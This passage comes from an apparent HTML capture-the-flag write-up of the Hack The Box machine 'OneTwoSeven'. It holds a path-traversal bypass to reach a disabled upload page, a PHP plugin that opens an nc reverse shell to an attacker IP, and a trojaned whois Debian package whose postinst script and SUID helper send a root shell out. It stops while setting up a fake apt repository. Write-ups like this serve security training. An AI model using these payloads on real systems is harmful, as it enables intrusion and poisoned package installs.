+                <span style="color:#333333;font-weight:400">$file_name</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span>&nbsp;basename<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$_FILES[</span><span style="color:#3ad900;font-weight:400">'addon'</span><span style="color:#333333;font-weight:400">][</span><span style="color:#3ad900;font-weight:400">'name'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                <span style="color:#333333;font-weight:400">$file_size</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#333333;font-weight:400">$_FILES[</span><span style="color:#3ad900;font-weight:400">'addon'</span><span style="color:#333333;font-weight:400">][</span><span style="color:#3ad900;font-weight:400">'size'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                <span style="color:#333333;font-weight:400">$file_tmp</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span><span style="color:#333333;font-weight:400">$_FILES[</span><span style="color:#3ad900;font-weight:400">'addon'</span><span style="color:#333333;font-weight:400">][</span><span style="color:#3ad900;font-weight:400">'tmp_name'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if(</span><span style="color:#333333;font-weight:400">$file_size</span>&nbsp;<span style="color:#ff9d00;font-weight:400">&gt;</span>&nbsp;<span style="color:#ff0044;font-weight:400">20000</span><span style="color:#ff9d00;font-weight:400">)</span>{<br>
+                <span style="color:#333333;font-weight:400">$errors[]</span><span style="color:#ff9d00;font-weight:400">=</span><span style="color:#3ad900;font-weight:400">'Module&nbsp;too&nbsp;big&nbsp;for&nbsp;addon&nbsp;manager.&nbsp;Please&nbsp;upload&nbsp;manually.'</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                }<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if(empty(</span><span style="color:#333333;font-weight:400">$errors</span><span style="color:#ff9d00;font-weight:400">)==</span><span style="color:#ff0044;font-weight:400">true</span><span style="color:#ff9d00;font-weight:400">)</span>&nbsp;{<br>
+                move_uploaded_file<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$file_tmp</span><span style="color:#ff9d00;font-weight:400">,</span><span style="color:#333333;font-weight:400">$file_name</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                header<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"Location:&nbsp;/menu.php"</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                header<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"Content-Type:&nbsp;text/plain"</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"File&nbsp;uploaded&nbsp;successfull.y"</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                }&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>&nbsp;{<br>
+                header<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"Location:&nbsp;/menu.php"</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                header<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"Content-Type:&nbsp;text/plain"</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Error&nbsp;uploading&nbsp;the&nbsp;file:&nbsp;"</span><span style="color:#ff9d00;font-weight:400">;</span><br>
+                <span style="color:#ff9d00;font-weight:700">print_r(</span><span style="color:#333333;font-weight:400">$errors</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                }<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">break</span>;
+            </div>
+        </div><br>
+        <br>
+        And also the source code for the <code>addon-download.php</code> functionality.<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">&lt;?php</span><br>
+                <span style="color:#ff9d00;font-weight:400">...</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Download&nbsp;addon&nbsp;from&nbsp;addons&nbsp;folder.</span><br>
+                <span style="color:#ff9d00;font-weight:700">case</span>&nbsp;preg_match<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">'/\/addon-download.php/'</span><span style="color:#ff9d00;font-weight:400">,</span><span style="color:#333333;font-weight:400">$_SERVER[</span><span style="color:#3ad900;font-weight:400">'REQUEST_URI'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">):</span><br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$_GET[</span><span style="color:#3ad900;font-weight:400">'addon'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">)</span>&nbsp;{<br>
+                <span style="color:#333333;font-weight:400">$addon_file</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span>&nbsp;basename<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$_GET[</span><span style="color:#3ad900;font-weight:400">'addon'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>&nbsp;file_exists<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$addon_file</span><span style="color:#ff9d00;font-weight:400">)</span>&nbsp;<span style="color:#ff9d00;font-weight:400">)</span>&nbsp;{<br>
+                header<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"Content-Disposition:&nbsp;attachment;&nbsp;filename=$addon_file"</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                header<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"Content-Type:&nbsp;text/plain"</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                readfile<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$addon_file</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                }&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>&nbsp;{<br>
+                header<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$_SERVER[</span><span style="color:#3ad900;font-weight:400">"SERVER_PROTOCOL"</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">.</span><span style="color:#3ad900;font-weight:400">"&nbsp;404&nbsp;Not&nbsp;Found"</span><span style="color:#ff9d00;font-weight:400">,</span>&nbsp;<span style="color:#ff0044;font-weight:400">true</span><span style="color:#ff9d00;font-weight:400">,</span>&nbsp;<span style="color:#ff0044;font-weight:400">404</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">die();</span><br>
+                }<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">break</span>;
+            </div>
+        </div><br>
+        <br>
+        <code>http://localhost:60080/addon-upload.php</code> isn't found on the server because it's been disabled.<br>
+        <img alt="images\2-21.png" src="images/2-21.png"><br>
+        <br>
+        If you look at how <code>addon-download.php</code> works:<br>
+        • <code>http://localhost:60080/addon-download.php?addon=ots-man-addon.php</code><br>
+        <br>
+        You can apply what's happening in the URL to access the <code>addon-upload.php</code> functionality.<br>
+        It's safe to assume that, since <code>addon-download.php</code> sits in the root of the web directory, <code>addon-upload.php</code> does too.<br>
+        <code>http://localhost:60080/addon-download.php?addon=../addon-upload.php</code><br>
+        <br>
+        <img alt="images\2-22.png" src="images/2-22.png"><br>
+        <br>
+        No 404 not found! It seems that we've found a way to access <code>addon-upload.php</code> despite it being disabled.<br>
+        <br>
+        <a id="h3-13" name="h3-13"></a><strong></strong>
+        <h3><strong>4e) Summary</strong></h3><br>
+        At this point, you know:<br>
+        • Scripts get uploaded to <code>http://127.0.0.1:60080/addons/</code><br>
+        • Scripts run by accessing them from menu.php - <code>http://127.0.0.1:60080/menu.php?addon=addons/ots-uptime.php</code><br>
+        • <code>addon-upload.php</code> can't be accessed via - <code>http://localhost:60080/addon-download.php?addon=../addon-upload.php</code><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Create Plugin/Reverse Shell</strong></h2><br>
+        This example plugin we got from download <code>ots-sysusers.php</code> can be used as a template to create our own “plugin".<br>
+        <br>
+        Write a reverse shell using the source code of <code>ots-sysusers.php</code> as a template.<br>
+        All you have to change is the command that's being run. Here's my reverse shell plugin.<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">&lt;?php</span>&nbsp;session_start<span style="color:#ff9d00;font-weight:400">();</span>&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(!</span>isset&nbsp;<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$_SESSION[</span><span style="color:#3ad900;font-weight:400">'username'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">))</span>&nbsp;{&nbsp;header<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"Location:&nbsp;/login.php"</span><span style="color:#ff9d00;font-weight:400">);</span>&nbsp;}<span style="color:#ff9d00;font-weight:400">;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>&nbsp;strpos<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$_SERVER[</span><span style="color:#3ad900;font-weight:400">'REQUEST_URI'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">,</span>&nbsp;<span style="color:#3ad900;font-weight:400">'/addons/'</span><span style="color:#ff9d00;font-weight:400">)</span>&nbsp;<span style="color:#ff9d00;font-weight:400">!==</span>&nbsp;<span style="color:#ff0044;font-weight:400">false</span>&nbsp;<span style="color:#ff9d00;font-weight:400">)</span>&nbsp;{&nbsp;<span style="color:#ff9d00;font-weight:700">die();</span>&nbsp;}<span style="color:#ff9d00;font-weight:400">;</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;OneTwoSeven&nbsp;Admin&nbsp;Plugin</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;OTS&nbsp;System&nbsp;Users</span><br>
+                <span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;shell_exec<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"nc&nbsp;10.10.14.4&nbsp;9001&nbsp;-e&nbsp;/bin/bash"</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">?&gt;</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) Upload Plugin</strong></h2><br>
+        Finally, we can upload a shell.<br>
+        <br>
+        First, we need to get a dummy POST request.<br>
+        After that, we can modify that POST request and upload our plugin/reverse shell.<br>
+        <br>
+        <a id="h3-14" name="h3-14"></a><strong></strong>
+        <h3><strong>6a) Retrieve dummy POST request</strong></h3><br>
+        The <code>Submit Query</code> button is greyed out, preventing us from uploading a plugin.<br>
+        <img alt="images\2-23.png" src="images/2-23.png"><br>
+        <br>
+        Change that with Right Click &gt; Inspect Element<br>
+        <img alt="images\2-24.png" src="images/2-24.png"><br>
+        <br>
+        Erase <code>disabled="disabled"</code> from the html code.<br>
+        <img alt="images\2-25.png" src="images/2-25.png"><br>
+        <br>
+        And the <code>Submit Query</code> button should be available now.<br>
+        <img alt="images\2-26.png" src="images/2-26.png"><br>
+        <br>
+        Upload your shell and submit.<br>
+        It won't work.<br>
+        <img alt="images\2-27.png" src="images/2-27.png"><br>
+        <br>
+        Now we should have a dummy POST request in Burp that we can modify.<br>
+        <br>
+        <a id="h3-15" name="h3-15"></a><strong></strong>
+        <h3><strong>6b) Modify dummy</strong></h3><br>
+        Grab the POST request from the Proxy &gt; HTTP history tab in Burp and Right Click &gt; Send to Repeater.<br>
+        <img alt="images\2-28.png" src="images/2-28.png"><br>
+        <br>
+        This is the <em></em>POST request/shell upload in Repeater tab.<br>
+        <img alt="images\2-29.png" src="images/2-29.png"><br>
+        <br>
+        Modify the POST URL to <code>/addon-download.php?addon=../addon-upload.php</code> and click Go.<br>
+        You'll get a 302 redirect and your file will get uploaded successfully!<br>
+        <br>
+        <img alt="images\2-30.png" src="images/2-30.png"><br>
+        <br>
+        Double-check that your upload has worked by checking whether it's listed in <code>/addons</code> or not.<br>
+        <img alt="images\2-31.png" src="images/2-31.png"><br>
+        <br>
+        It has!<br>
+        (my plugin is <code>toucan-plugin.php</code>, at the bottom)<br>
+        <br>
+        <a id="h3-16" name="h3-16"></a><strong></strong>
+        <h3><strong>6c) Reverse shell</strong></h3><br>
+        Ready a listener on your attacking machine to receive the shell<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And get the <code>php</code> script the same way all of the other plugins are being run - through the <code>/menu.php</code> panel.<br>
+        <code>http://localhost:60080/menu.php?addon=addons/toucan-plugin.php</code><br>
+        <br>
+        You should receive a call back on your listener :)<br>
+            <div class="codebox">
+                ...<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.4]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.133]&nbsp;59734<br>
+                id<br>
+                uid=35(www-admin-data)&nbsp;gid=35(www-admin-data)&nbsp;groups=35(www-admin-data)<br>
+                python&nbsp;-c&nbsp;'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'&nbsp;<br>
+                www-admin-data@onetwoseven:/var/www/html-admin$&nbsp;cd&nbsp;~<br>
+                www-admin-data@onetwoseven:/var/www$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) Find Priv-Esc Vector</strong></h2><br>
+        List what's possible with <code>sudo</code> as user <code>www-admin-data</code>:<br>
+            <div class="codebox">
+                www-admin-data@onetwoseven:/var/www$&nbsp;sudo&nbsp;-l<br>
+                sudo&nbsp;-l<br>
+                Matching&nbsp;Defaults&nbsp;entries&nbsp;for&nbsp;www-admin-data&nbsp;on&nbsp;onetwoseven:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;env_reset,&nbsp;env_keep+="ftp_proxy&nbsp;http_proxy&nbsp;https_proxy&nbsp;no_proxy",<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;mail_badpass,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br>
+                <br>
+                User&nbsp;www-admin-data&nbsp;may&nbsp;run&nbsp;the&nbsp;following&nbsp;commands&nbsp;on&nbsp;onetwoseven:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;(ALL&nbsp;:&nbsp;ALL)&nbsp;NOPASSWD:&nbsp;/usr/bin/apt-get&nbsp;update,&nbsp;/usr/bin/apt-get&nbsp;upgrade
+            </div>
+        </div><br>
+        <br>
+        We can set some environment variables.<br>
+        The important one is <code>http_proxy</code> which will redirect all port 80 traffic to a host elsewhere.<br>
+        <br>
+        And there are 2 commands that we can run!<br>
+        <code>sudo apt-get update</code> and <code>sudo apt-get upgrade</code><br>
+        <br>
+        <code>apt-get update</code> will retrieve information about new packages to be installed.<br>
+        <code>apt-get upgrade</code> will run as root and install those new packages.<br>
+        <br>
+        The path to root, then, involves installing a new, malicious package.<br>
+        <br>
+        The only method of installing new packages using <code>apt</code> available to us with the current <code>sudo</code> permissions is via <code>upgrade</code>.<br>
+        <code>upgrade</code> will install new versions of packages.<br>
+        <br>
+        This means, to get our package installed, we'll have to provide a malicious, upgraded version of an already existing package on the system.<br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>8) Create Malicious Package</strong></h2><br>
+        This is the easy bit.<br>
+        None of this is easy but compared to what's coming, this is the do-able part.<br>
+        <br>
+        <a id="h3-17" name="h3-17"></a><strong></strong>
+        <h3><strong>8a) What package to create a malicious, “upgraded� version of?</strong></h3><br>
+        First, we need to find a package that we can modify and create a malicious, “upgraded� version of.<br>
+        <br>
+        Have a look at the packages already installed on the system:<br>
+            <div class="codebox">
+                www-admin-data@onetwoseven:/var/www$&nbsp;dpkg&nbsp;-l<br>
+                Desired=Unknown/Install/Remove/Purge/Hold<br>
+                |&nbsp;Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend<br>
+                |/&nbsp;Err?=(none)/Reinst-required&nbsp;(Status,Err:&nbsp;uppercase=bad)<br>
+                ||/&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Architecture&nbsp;Description<br>
+                +++-==============-============-============-=================================<br>
+                ii&nbsp;&nbsp;adduser&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.115&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;all&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;and&nbsp;remove&nbsp;users&nbsp;and&nbsp;groups<br>
+                ii&nbsp;&nbsp;apache2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.4.25-3+deb&nbsp;amd64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;HTTP&nbsp;Server<br>
+                ii&nbsp;&nbsp;apache2-bin&nbsp;&nbsp;&nbsp;&nbsp;2.4.25-3+deb&nbsp;amd64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;HTTP&nbsp;Server&nbsp;(modules&nbsp;and&nbsp;o<br>
+                ii&nbsp;&nbsp;apache2-data&nbsp;&nbsp;&nbsp;2.4.25-3+deb&nbsp;all&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;HTTP&nbsp;Server&nbsp;(common&nbsp;files)<br>
+                ii&nbsp;&nbsp;apache2-utils&nbsp;&nbsp;2.4.25-3+deb&nbsp;amd64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;HTTP&nbsp;Server&nbsp;(utility&nbsp;progr<br>
+                ii&nbsp;&nbsp;apt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.4.9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;amd64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;commandline&nbsp;package&nbsp;manager<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        From the results, I chose <code>whois</code>.<br>
+        I was looking for a simple, non-crucial system binary and <code>whois</code> seemed like a decent enough choice.<br>
+        <br>
+        Read the details of the <code>whois</code> package. This file will be useful later.<br>
+            <div class="codebox">
+                www-admin-data@onetwoseven:/var/www$&nbsp;apt-cache&nbsp;show&nbsp;whois<br>
+                Package:&nbsp;whois<br>
+                Version:&nbsp;5.2.17~deb9u1<br>
+                Installed-Size:&nbsp;343<br>
+                Maintainer:&nbsp;Marco&nbsp;d'Itri&nbsp;&lt;md@linux.it&gt;<br>
+                Architecture:&nbsp;amd64<br>
+                Depends:&nbsp;libc6&nbsp;(&gt;=&nbsp;2.15),&nbsp;libidn11&nbsp;(&gt;=&nbsp;1.13)<br>
+                Description:&nbsp;intelligent&nbsp;WHOIS&nbsp;client<br>
+                Description-md5:&nbsp;28e9df99a50bdfe098edfcf773417990<br>
+                Tag:&nbsp;implemented-in::c,&nbsp;interface::commandline,&nbsp;network::client,<br>
+                &nbsp;protocol::ip,&nbsp;protocol::ipv6,&nbsp;role::program,&nbsp;suite::gnu,&nbsp;use::checking,<br>
+                &nbsp;use::searching<br>
+                Section:&nbsp;net<br>
+                Priority:&nbsp;optional<br>
+                Filename:&nbsp;pool/DEBIAN/main/w/whois/whois_5.2.17~deb9u1_amd64.deb<br>
+                Size:&nbsp;76772<br>
+                MD5sum:&nbsp;ac528a3b41bcdc8e78084d61e4aa2957<br>
+                SHA256:&nbsp;296aa4d2bb6ee15c7db129a4a3a0c8abbf1acb75770b4ee9241a47ee2ca37551
+            </div>
+        </div><br>
+        <br>
+        Details to note<br>
+        • <code>Version</code> - we'll be modifying this so that we can install our malicious <code>whois</code> package via <code>apt-get upgrade</code><br>
+        • <code>Architecture: amd64</code> - knowing that whois is a 64bit binary tells us how to serve the package later<br>
+        • <code>Filename</code> - specifies the location of where to download the package from<br>
+        • <code>Size</code> - will need to be modified to indicate the size of our modified, malicious <code>whois</code><br>
+        • <code>MD5sum/SHA256</code> - hashes will be replaced with the hashes of the modfied <code>whois</code><br>
+        <br>
+        <a id="h3-18" name="h3-18"></a><strong></strong>
+        <h3><strong>8b) Retrieve copy of whois_5.2.17~deb9u1_amd64.deb</strong></h3><br>
+        We now need a copy of <code>whois</code> to modify.<br>
+        The current version of <code>whois</code> installed is <code>5.2.17~deb9u1</code>, so I googled for that version and downloaded it.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/apt-exploit#&nbsp;wget&nbsp;http://ftp.br.debian.org/debian/pool/main/w/whois/whois_5.2.17~deb9u1_amd64.deb
+            </div>
+        </div><br>
+        <br>
+        Extract the <code>whois</code> package to a temp folder where you can modify the package contents.<br>
+        My temp folder is <code>whois_mod</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/apt-exploit#&nbsp;dpkg-deb&nbsp;-R&nbsp;whois_5.2.17~deb9u1_amd64.deb&nbsp;whois_mod
+            </div>
+        </div><br>
+        • <code>DEBIAN/control</code> contains information about the package and the version number<br>
+        • <code>/usr/bin</code> contains the binaries that get installed via the package<br>
+        <br>
+        <a id="h3-19" name="h3-19"></a><strong></strong>
+        <h3><strong>8c) Modify the whois package</strong></h3><br>
+        <br>
+        <strong>Increase Version Number</strong><br>
+        Specify that this is a new version of the <code>whois</code> package by modifying the Version header in the <code>/DEBIAN/control</code> file.<br>
+        I changed the header from <code>Version: 5.2.17~deb9u1</code> to <code>Version: 5.2.18~deb9u1</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/apt-exploit#&nbsp;nano&nbsp;whois_mod/DEBIAN/control<br>
+                ...<br>
+                Version:&nbsp;5.2.18~deb9u1<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <strong>Create Malicious postinst File</strong><br>
+        The <code>postinst</code> file exists in all (most) packages and runs after the package get installed. All the commands in the file run as root. This is where command execution as root is possible.<br>
+        <br>
+        Create a malicious <code>postinst</code> file in the <code>/DEBIAN</code> directory. Instead of having the usual package-cleanup commands in here, write a reverse shell.<br>
+        This reverse shell will run as root and send a root shell back to our listener.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/apt-exploit/whois_mod/DEBIAN#&nbsp;nano&nbsp;postinst<br>
+                #malicious&nbsp;postinst&nbsp;:)<br>
+                #!/bin/sh<br>
+                nc&nbsp;10.10.14.7&nbsp;9002&nbsp;-e&nbsp;/bin/bash
+            </div>
+        </div><br>
+        <br>
+        Set the permissions of the <code>postinst</code> file to <code>755</code> so that the package builder will accept it.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/apt-exploit/whois_mod/DEBIAN#&nbsp;chmod&nbsp;755&nbsp;postinst
+            </div>
+        </div><br>
+        <br>
+        <strong>Craft Malicious Script to be Installed</strong><br>
+        As a backup, we can install a backdoor reverse shell script to the system.<br>
+        You shouldn't have to use this, but just in case.<br>
+        <br>
+        <code>/usr/bin</code> in the <code>whois_mod</code> directory contains all the binaries/scripts that will get installed to the system when the package is installed. I created a reverse shell script called <code>whoisroot</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/apt-exploit/whois_mod/usr/bin#&nbsp;nano&nbsp;whoisroot<br>
+                #!/bin/sh<br>
+                nc&nbsp;10.10.14.7&nbsp;9002&nbsp;-e&nbsp;/bin/bash
+            </div>
+        </div><br>
+        <br>
+        In order to get a reverse shell as root from the script, add a SUID bit to the file and give all users execute permissions.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/apt-exploit/whois_mod/usr/bin#&nbsp;chmod&nbsp;755&nbsp;whoisroot<br>
+                root@gotham:~/ctf/onetwoseven/apt-exploit/whois_mod/usr/bin#&nbsp;chmod&nbsp;+s&nbsp;whoisroot<br>
+                root@gotham:~/ctf/onetwoseven/apt-exploit/whois_mod/usr/bin#&nbsp;ls&nbsp;-l<br>
+                total&nbsp;176<br>
+                -rwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;19016&nbsp;Jul&nbsp;27&nbsp;&nbsp;2017&nbsp;mkpasswd<br>
+                -rwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;152760&nbsp;Jul&nbsp;27&nbsp;&nbsp;2017&nbsp;whois<br>
+                -rwsr-sr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;42&nbsp;Jul&nbsp;&nbsp;2&nbsp;18:52&nbsp;whoisroot
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-20" name="h3-20"></a><strong></strong>
+        <h3><strong>8d) Build modified whois package</strong></h3><br>
+        We're done modifying! Rebuild the modified <code>whois_mod</code> package and name it as it's an upgrade - <code>whois_5.2.18~deb9u1_amd64.deb</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/apt-exploit#&nbsp;dpkg-deb&nbsp;-b&nbsp;whois_mod&nbsp;whois_5.2.18~deb9u1_amd64.deb<br>
+                dpkg-deb:&nbsp;building&nbsp;package&nbsp;'whois'&nbsp;in&nbsp;'whois_5.2.18~deb9u1_amd64.deb'.
+            </div>
+        </div><br>
+        <br>
+        We now have a malicious <code>whois</code> package that will get a us a root shell :)<br>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>9) How to serve malicious package?</strong></h2><br>
+        Now we need to gather some info on what repositories/files <code>apt-get update</code> is trying to retrieve so that we can create our fake repository and serve our malicious <code>whois</code> upgrade.<br>
+        <br>
+        <a id="h3-21" name="h3-21"></a><strong></strong>
+        <h3><strong>9a) What repository to imitate?</strong></h3><br>
+        Check what repositories <code>apt-get update</code> is querying.<br>
+            <div class="codebox">
+                www-admin-data@onetwoseven:/var/www$&nbsp;sudo&nbsp;apt-get&nbsp;update<br>
+                sudo&nbsp;apt-get&nbsp;update<br>
+                Err:1&nbsp;http://packages.onetwoseven.htb/devuan&nbsp;ascii&nbsp;InRelease<br>
+                &nbsp;&nbsp;Temporary&nbsp;failure&nbsp;resolving&nbsp;'packages.onetwoseven.htb'<br>
+                Err:2&nbsp;http://de.deb.devuan.org/merged&nbsp;ascii&nbsp;InRelease<br>
+                &nbsp;&nbsp;Temporary&nbsp;failure&nbsp;resolving&nbsp;'de.deb.devuan.org'<br>
+                Err:3&nbsp;http://de.deb.devuan.org/merged&nbsp;ascii-security&nbsp;InRelease<br>
+                &nbsp;&nbsp;Temporary&nbsp;failure&nbsp;resolving&nbsp;'de.deb.devuan.org'<br>
+                Err:4&nbsp;http://de.deb.devuan.org/merged&nbsp;ascii-updates&nbsp;InRelease<br>
+                &nbsp;&nbsp;Temporary&nbsp;failure&nbsp;resolving&nbsp;'de.deb.devuan.org'<br>
+                Reading&nbsp;package&nbsp;lists...&nbsp;Error!<br>
+                W:&nbsp;Failed&nbsp;to&nbsp;fetch&nbsp;http://de.deb.devuan.org/merged/dists/ascii/InRelease&nbsp;&nbsp;Temporary&nbsp;failure&nbsp;resolving&nbsp;'de.deb.devuan.org'<br>
+                W:&nbsp;Failed&nbsp;to&nbsp;fetch&nbsp;http://de.deb.devuan.org/merged/dists/ascii-security/InRelease&nbsp;&nbsp;Temporary&nbsp;failure&nbsp;resolving&nbsp;'de.deb.devuan.org'<br>
+                W:&nbsp;Failed&nbsp;to&nbsp;fetch&nbsp;http://de.deb.devuan.org/merged/dists/ascii-updates/InRelease&nbsp;&nbsp;Temporary&nbsp;failure&nbsp;resolving&nbsp;'de.deb.devuan.org'<br>
+                W:&nbsp;Failed&nbsp;to&nbsp;fetch&nbsp;http://packages.onetwoseven.htb/devuan/dists/ascii/InRelease&nbsp;&nbsp;Temporary&nbsp;failure&nbsp;resolving&nbsp;'packages.onetwoseven.htb'<br>
+                W:&nbsp;Some&nbsp;index&nbsp;files&nbsp;failed&nbsp;to&nbsp;download.&nbsp;They&nbsp;have&nbsp;been&nbsp;ignored,&nbsp;or&nbsp;old&nbsp;ones&nbsp;used&nbsp;instead.<br>
